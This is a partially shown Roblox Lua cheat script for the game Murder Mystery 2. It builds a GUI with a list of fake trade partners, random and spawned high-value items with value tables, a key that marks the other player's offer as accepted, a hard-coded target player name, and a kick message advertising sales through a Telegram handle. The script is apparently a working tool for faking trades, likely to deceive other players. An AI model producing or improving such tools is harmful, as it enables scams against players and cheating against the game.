...
local TARGET_NAME = "gghty790"
local KICK_MESSAGE = "ЗА ПОКУПКОЙ ПИСАТЬ В ТГ @prodamsifon11"
...
local RareRarities = { Godly = true, Unique = true, Chroma = true, Legendary = true, Classic = true }
do
...
-- ============================================
-- СОЗДАНИЕ GUI С OPEN/CLOSE КНОПКАМИ
-- ============================================
...
openStroke.Color = Color3.fromRGB(200, 100, 130)
openStroke.Thickness = 2
openStroke.Transparency = 0.3
openStroke.Parent = openButton

-- КРАСИВАЯ КНОПКА CLOSE (изначально скрыта)
...
closeButton.TextColor3 = Color3.fromRGB(200, 80, 120)
closeButton.ZIndex = 999
closeButton.Visible = false
closeButton.Parent = controlGui
...
closeStroke.Color = Color3.fromRGB(200, 100, 130)
...
do
    ...
    mainStroke.Color = Color3.fromRGB(180, 80, 100)
...
titleLabel.Text = "СКРИПТ ОТ amechanmm2"
titleLabel.Font = Enum.Font.FredokaOne
titleLabel.TextSize = 16
titleLabel.TextColor3 = Color3.fromRGB(200, 80, 120)
...
for _, c in ipairs(Corners) do
	...
	btn.TextSize = 16
	btn.TextColor3 = Color3.fromRGB(200, 80, 120)
	btn.AutoButtonColor = false
	btn.ZIndex = 10
	btn.Parent = mainFrame

	btn.MouseEnter:Connect(function() btn.TextColor3 = Color3.fromRGB(255, 150, 180) end)
	btn.MouseLeave:Connect(function() btn.TextColor3 = Color3.fromRGB(200, 80, 120) end)
...
function setActiveTab(tabName)
	...
	for name, data in pairs(tabButtons) do
		...
		TweenService:Create(data.button, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
			BackgroundColor3 = isActive and Color3.fromRGB(255, 182, 193) or Color3.fromRGB(255, 200, 210)
		}):Play()
		local targetColor = isActive and Color3.fromRGB(180, 80, 100) or Color3.fromRGB(200, 120, 140)
		local targetThickness = isActive and 2 or 1
		...
		if isActive then
			...
			activeTabPulseTween = TweenService:Create(data.stroke, pulseInfo, {
				Color = targetColor:Lerp(Color3.fromRGB(255, 200, 220), 0.3),
				Thickness = 2.5
			})
...
for i, tabName in ipairs(tabs) do
	...
	tabButton.BackgroundColor3 = i == 1 and Color3.fromRGB(255, 182, 193) or Color3.fromRGB(255, 200, 210)
	tabButton.BackgroundTransparency = 0.3
	tabButton.Text = tabName
	tabButton.Font = Enum.Font.FredokaOne
	tabButton.TextSize = 10
	tabButton.TextColor3 = Color3.fromRGB(150, 60, 80)
	...
	tabStroke.Color = i == 1 and Color3.fromRGB(180, 80, 100) or Color3.fromRGB(200, 120, 140)
...
local function CreateButton(Frame, Text, Function)
	...
	Button.BackgroundColor3 = Color3.fromRGB(255, 150, 170)
	Button.BackgroundTransparency = 0.2
	Button.Text = Text
	Button.Font = Enum.Font.FredokaOne
	Button.TextSize = 14
	Button.TextColor3 = Color3.fromRGB(150, 60, 80)
	Button.Parent = Frame
	...
	Stroke.Color = Color3.fromRGB(200, 100, 130)
...
local function CreateToggleButton(Frame, Text, Callback)
	...
	local OnColor = Color3.fromRGB(255, 100, 140)
	local OffColor = Color3.fromRGB(255, 150, 170)
...
function createSettingRow(labelText, defaultValue, parent)
	...
	heading.TextSize = 12
	heading.TextColor3 = Color3.fromRGB(180, 100, 120)
	heading.TextXAlignment = Enum.TextXAlignment.Left
	heading.Parent = row

	local box = Instance.new("TextBox")
	box.Size = UDim2.new(1, 0, 0, 25)
	box.BackgroundColor3 = Color3.fromRGB(255, 200, 210)
	box.BackgroundTransparency = 0.2
	box.Text = defaultValue
	box.Font = Enum.Font.SourceSans
	box.TextSize = 14
	box.TextColor3 = Color3.fromRGB(150, 60, 80)
	...
	local stroke = Instance.new("UIStroke")
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Color = Color3.fromRGB(200, 120, 140)
	...
	box.Focused:Connect(function()
		...
		pulsationTweens[box] = TweenService:Create(stroke, pulseInfo, {
			Color = Color3.fromRGB(180, 80, 100):Lerp(Color3.fromRGB(220, 120, 150), 0.5),
			Thickness = 1.5,
			Transparency = 0.2
		})
	...
	box.FocusLost:Connect(function()
		...
		TweenService:Create(stroke, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
			Color = Color3.fromRGB(200, 120, 140),
			Thickness = 1.0,
			Transparency = 0.5
		}):Play()
	end)
...
local FakeTradePartners = {
	...
	"xX_DarkSoul_Xx", "BlazingPhoenix", "ShadowStriker99", "LunarEclipse",
	"SolarFlare_X", "CrimsonTide", "FrostBite_YT", "ThunderStrike",
	"VenomousFang", "CelestialMage", "DarkKnight_77", "IceQueen_YT",
	"FireStorm_X", "NightHawk_99", "SilverShadow", "GoldenFury",
	"PhantomBlade", "StormChaser", "MysticDragon", "RagingWolf",
	"SilentAssassin", "CrystalHeart", "DarkPhoenix", "LightningBolt",
	"ShadowReaper", "FrostKing", "BlazeMaster", "NightWing",
	"StarGazer_X", "ThunderFox", "IceBreaker", "FireCracker",
	"DarkWizard", "MoonWalker", "SunKnight", "StormRider",
	"ShadowFox", "CrystalDragon", "RavenClaw", "WolfPack",
	"NightStalker", "GhostRider", "DragonSlayer", "FrostQueen",
	"BlazeRunner", "ShadowHunter", "ThunderWolf", "IcePhoenix",
	"DarkEmperor", "StarLord_X", "FireFalcon", "NightReaper",
}

CreateButton(controlFrame, "Random player [Q]", function()
...
CreateSpace(controlFrame)
CreateButton(controlFrame, "Start trade [X]", function()
	StartTrade()
end)
CreateSpace(controlFrame)
CreateButton(controlFrame, "Random items [C]", function()
...
CreateSpace(controlFrame)
CreateButton(controlFrame, "Accept their offer [V]", function()
...
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	...
	if key == Enum.KeyCode.Q then
		...
		print("[mm2run/keybind] Q - picked fake partner: " .. chosen)
		
	elseif key == Enum.KeyCode.X then
		StartTrade()
		print("[mm2run/keybind] X - StartTrade")
		
	elseif key == Enum.KeyCode.C then
		if #weaponButtons == 0 then
			print("[mm2run/keybind] C - item list not built yet")
			return
		end
		local info = weaponButtons[math.random(1, #weaponButtons)]
		local ok = OfferItemAnotherPlayer(info.entry.key, "Weapons")
		if ok then
			print("[mm2run/keybind] C - added random item: " .. info.entry.name)
		else
			print("[mm2run/keybind] C - couldn't add " .. info.entry.name)
		end
		
	elseif key == Enum.KeyCode.V then
		if not next(TradeTable["Player1"]["Offer"]) and not next(TradeTable["Player2"]["Offer"]) then
			print("[mm2run/keybind] V - no items to accept")
			return
		end
		if v84 then
			print("[mm2run/keybind] V - cooldown active")
			return
		end
		TheirOffer.Accepted.Visible = true
		TradeTable["Player2"]["Accepted"] = true
		AcceptTrade()
		print("[mm2run/keybind] V - AcceptTrade")
...
-- ============================================
-- ОСТАЛЬНОЙ КОД (SilentBlock, Items, Spawner, Players, Values)
-- ============================================
...
weaponListLabel.TextColor3 = Color3.fromRGB(200, 80, 120)
...
weaponScrollFrame.BackgroundColor3 = Color3.fromRGB(255, 200, 210)
weaponScrollFrame.BackgroundTransparency = 0.3
weaponScrollFrame.BorderSizePixel = 0
weaponScrollFrame.ScrollBarThickness = 6
weaponScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(200, 100, 130)
...
do
    ...
    weaponScrollStroke.Color = Color3.fromRGB(200, 120, 140)
...
-- ВСЕ ГОДЛЫ (БЕЗ ТРОФЕЙНЫХ) + ПЛЯЖНЫЙ СЕТ + МОРОЖЕНОЕ
local ItemsTabAllowedNames = {
	-- ПЛЯЖНЫЙ СЕТ (Beach Set)
	"Beach Knife",
	"Beach Gun",
	"Chroma Beach Knife",
	"Chroma Beach Gun",
	...
	"Paradise Knife",
	"Paradise Gun",
	"Chroma Paradise Knife",
	"Chroma Paradise Gun",
	
	-- МОРОЖЕНОЕ ИЗ БОКСОВ (Ice Cream Set)
	"Vanilla Knife",
	"Vanilla Gun",
	"Chroma Vanilla Knife",
	"Chroma Vanilla Gun",
	"Chocolate Knife",
	"Chocolate Gun",
	"Chroma Chocolate Knife",
	"Chroma Chocolate Gun",
	"Strawberry Knife",
	"Strawberry Gun",
	"Chroma Strawberry Knife",
	"Chroma Strawberry Gun",
	"Caramel Knife",
	"Caramel Gun",
	"Chroma Caramel Knife",
	"Chroma Caramel Gun",
	"Mint Knife",
	"Mint Gun",
	"Chroma Mint Knife",
	...
	"Pistachio Knife",
	"Pistachio Gun",
	"Chroma Pistachio Knife",
	"Chroma Pistachio Gun",
	"Blueberry Knife",
	"Blueberry Gun",
	"Chroma Blueberry Knife",
	"Chroma Blueberry Gun",
	"Raspberry Knife",
	"Raspberry Gun",
	"Chroma Raspberry Knife",
	"Chroma Raspberry Gun",
	"Coconut Knife",
	"Coconut Gun",
	"Chroma Coconut Knife",
	"Chroma Coconut Gun",
	"Almond Knife",
	"Almond Gun",
	"Chroma Almond Knife",
	...
	"Hazelnut Knife",
	"Hazelnut Gun",
	"Chroma Hazelnut Knife",
	"Chroma Hazelnut Gun",
	"Milkshake Knife",
	"Milkshake Gun",
	"Chroma Milkshake Knife",
	"Chroma Milkshake Gun",
	"Sorbet Knife",
	"Sorbet Gun",
	"Chroma Sorbet Knife",
	"Chroma Sorbet Gun",
	...
	"Obsidian Deathshard",
	"Crystal Deathshard",
	"Crystaline Deathshard",
	"Crystalline Deathshard",
	"Red Deathshard",
	"Orange Deathshard",
	"Yellow Deathshard",
	"Green Deathshard",
...
local SpawnerAllowedBases = {
	...
	"Candy", "Heartblade",
	"Darkbringer", "Lightbringer", "Luger", "Shark", "Heat",
	"Old Glory", "Amerilaser", "Gingerblade", "Gemstone", "Seer",
	"Saw", "Laser", "Tides", "Red Luger", "Slasher", "Batwing",
	"Deathshard", "Hallowsblade", "Hallowscythe", "Boneblade",
	"Eternal", "Eternal III", "Eternal IV", "Luger Cane",
	"Nebula", "Frostbite", "Phantom", "Shadow", "Venom", "Viper",
	"Blood", "Dark", "Light", "Fire", "Ice", "Storm", "Thunder",
	"Spirit", "Soul",
	
	-- Пляжный сет
	"Beach Knife", "Beach Gun", "Shell Knife", "Shell Gun",
	"Wave Knife", "Wave Gun", "Summer Knife", "Summer Gun",
	"Paradise Knife", "Paradise Gun",
	
	-- Мороженое из боксов
	"Vanilla Knife", "Vanilla Gun", "Chocolate Knife", "Chocolate Gun",
	"Strawberry Knife", "Strawberry Gun", "Caramel Knife", "Caramel Gun",
	"Mint Knife", "Mint Gun", "Cookies Knife", "Cookies Gun",
	"Cherry Knife", "Cherry Gun", "Pistachio Knife", "Pistachio Gun",
	"Blueberry Knife", "Blueberry Gun", "Raspberry Knife", "Raspberry Gun",
	"Coconut Knife", "Coconut Gun", "Almond Knife", "Almond Gun",
	"Hazelnut Knife", "Hazelnut Gun", "Milkshake Knife", "Milkshake Gun",
	"Sorbet Knife", "Sorbet Gun", "Gelato Knife", "Gelato Gun",
	"Fudge Knife", "Fudge Gun", "Toffee Knife", "Toffee Gun",
}
...
local KnownEvoBases = {
	...
	seer = true, luger = true, shark = true, heat = true, laser = true,
	saw = true, tides = true, slasher = true, batwing = true, deathshard = true,
}
...
spawnerStatusLabel.TextColor3 = Color3.fromRGB(200, 80, 120)
...
spawnerScrollFrame.BackgroundColor3 = Color3.fromRGB(255, 200, 210)
spawnerScrollFrame.BackgroundTransparency = 0.3
spawnerScrollFrame.BorderSizePixel = 0
spawnerScrollFrame.ScrollBarThickness = 6
spawnerScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(200, 100, 130)
...
do
	...
	s.Color = Color3.fromRGB(200, 120, 140) s.Thickness = 1 s.Parent = spawnerScrollFrame
...
do
	local raw = {
		...
		["Beach Knife"]        = 120,
		["Beach Gun"]          = 110,
		["Chroma Beach Knife"] = 1200,
		["Chroma Beach Gun"]   = 1100,
		["Shell Knife"]        = 100,
		["Shell Gun"]          = 90,
		["Chroma Shell Knife"] = 1000,
		["Chroma Shell Gun"]   = 900,
		["Wave Knife"]         = 80,
		["Wave Gun"]           = 75,
		["Chroma Wave Knife"]  = 800,
		["Chroma Wave Gun"]    = 750,
		["Summer Knife"]       = 70,
		["Summer Gun"]         = 65,
		["Chroma Summer Knife"] = 700,
		["Chroma Summer Gun"]  = 650,
		["Paradise Knife"]     = 60,
		["Paradise Gun"]       = 55,
		["Chroma Paradise Knife"] = 600,
		["Chroma Paradise Gun"] = 550,
		
		-- Мороженое из боксов
		["Vanilla Knife"]      = 50,
		["Vanilla Gun"]        = 45,
		["Chroma Vanilla Knife"] = 500,
		["Chroma Vanilla Gun"] = 450,
		["Chocolate Knife"]    = 50,
		["Chocolate Gun"]      = 45,
		["Chroma Chocolate Knife"] = 500,
		["Chroma Chocolate Gun"] = 450,
		["Strawberry Knife"]   = 50,
		["Strawberry Gun"]     = 45,
		["Chroma Strawberry Knife"] = 500,
		["Chroma Strawberry Gun"] = 450,
		["Caramel Knife"]      = 50,
		["Caramel Gun"]        = 45,
		["Chroma Caramel Knife"] = 500,
		["Chroma Caramel Gun"] = 450,
		["Mint Knife"]         = 50,
		["Mint Gun"]           = 45,
		["Chroma Mint Knife"]  = 500,
		["Chroma Mint Gun"]    = 450,
		["Cookies Knife"]      = 50,
		["Cookies Gun"]        = 45,
		["Chroma Cookies Knife"] = 500,
		["Chroma Cookies Gun"] = 450,
		["Cherry Knife"]       = 50,
		["Cherry Gun"]         = 45,
		["Chroma Cherry Knife"] = 500,
		["Chroma Cherry Gun"]  = 450,
		["Pistachio Knife"]    = 50,
		["Pistachio Gun"]      = 45,
		["Chroma Pistachio Knife"] = 500,
		["Chroma Pistachio Gun"] = 450,
		["Blueberry Knife"]    = 50,
		["Blueberry Gun"]      = 45,
		["Chroma Blueberry Knife"] = 500,
		["Chroma Blueberry Gun"] = 450,
		["Raspberry Knife"]    = 50,
		["Raspberry Gun"]      = 45,
		["Chroma Raspberry Knife"] = 500,
		["Chroma Raspberry Gun"] = 450,
		["Coconut Knife"]      = 50,
		["Coconut Gun"]        = 45,
		["Chroma Coconut Knife"] = 500,
		["Chroma Coconut Gun"] = 450,
		["Almond Knife"]       = 50,
		["Almond Gun"]         = 45,
		["Chroma Almond Knife"] = 500,
		["Chroma Almond Gun"]  = 450,
		["Hazelnut Knife"]     = 50,
		["Hazelnut Gun"]       = 45,
		["Chroma Hazelnut Knife"] = 500,
		["Chroma Hazelnut Gun"] = 450,
		["Milkshake Knife"]    = 50,
		["Milkshake Gun"]      = 45,
		["Chroma Milkshake Knife"] = 500,
		["Chroma Milkshake Gun"] = 450,
		["Sorbet Knife"]       = 50,
		["Sorbet Gun"]         = 45,
		["Chroma Sorbet Knife"] = 500,
		["Chroma Sorbet Gun"]  = 450,
		["Gelato Knife"]       = 50,
		["Gelato Gun"]         = 45,
		["Chroma Gelato Knife"] = 500,
		["Chroma Gelato Gun"]  = 450,
		["Fudge Knife"]        = 50,
		["Fudge Gun"]          = 45,
		["Chroma Fudge Knife"] = 500,
		["Chroma Fudge Gun"]   = 450,
		["Toffee Knife"]       = 50,
		["Toffee Gun"]         = 45,
		["Chroma Toffee Knife"] = 500,
		["Chroma Toffee Gun"]  = 450,
	}
...
playersStatusLabel.TextColor3 = Color3.fromRGB(180, 100, 120)
...
playersRefreshBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 170)
...
playersRefreshBtn.TextColor3 = Color3.fromRGB(150, 60, 80)
...
playersScroll.ScrollBarImageColor3 = Color3.fromRGB(200, 100, 130)
...
local IDLE_HEADER_COLOR = Color3.fromRGB(255, 182, 193)
...
local function createPlayerRow(player)
	...
	hStroke.Color = Color3.fromRGB(200, 100, 130)
	hStroke.Thickness = 1
	...
	nameLabel.TextColor3 = Color3.fromRGB(150, 60, 80)
	...
	valLabel.TextColor3 = Color3.fromRGB(200, 80, 120)
	...
	rowBlockBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 100)
...
local function updatePlayerValue(row)
	...
	row.valLabel.TextColor3 = (total > 0) and Color3.fromRGB(200, 80, 120) or Color3.fromRGB(180, 180, 180)
end
	...
	for _, row in pairs(playerRows) do
		task.spawn(function()
			...
			if pending <= 0 and playersStatusLabel then
				playersStatusLabel.Text = "ready"
				playersStatusLabel.TextColor3 = Color3.fromRGB(200, 80, 120)
			end
		end)
	end
end
...
local function HttpGetJSON(url)
	...
	elseif status == "timeout" then		warn("[mm2run/http] HttpGet TIMED OUT after 8s for " .. url)
	elseif status == "err" then
...
valueStatusLabel.TextColor3 = Color3.fromRGB(200, 80, 120)
...
resultsScroll.BackgroundColor3 = Color3.fromRGB(255, 200, 210)
resultsScroll.BackgroundTransparency = 0.3
resultsScroll.BorderSizePixel = 0
resultsScroll.ScrollBarThickness = 6
resultsScroll.ScrollBarImageColor3 = Color3.fromRGB(200, 100, 130)
...
local function RenderValueResults(items)
	...
	for _, item in ipairs(items) do
		...
		row.BackgroundColor3 = Color3.fromRGB(255, 182, 193)
		...
		nameLbl.TextSize = 13
		nameLbl.TextColor3 = Color3.fromRGB(150, 60, 80)
		...
		metaLbl.TextSize = 11
		metaLbl.TextColor3 = Color3.fromRGB(180, 100, 120)
		...
		valLbl.TextSize = 14
		valLbl.TextColor3 = Color3.fromRGB(200, 80, 120)
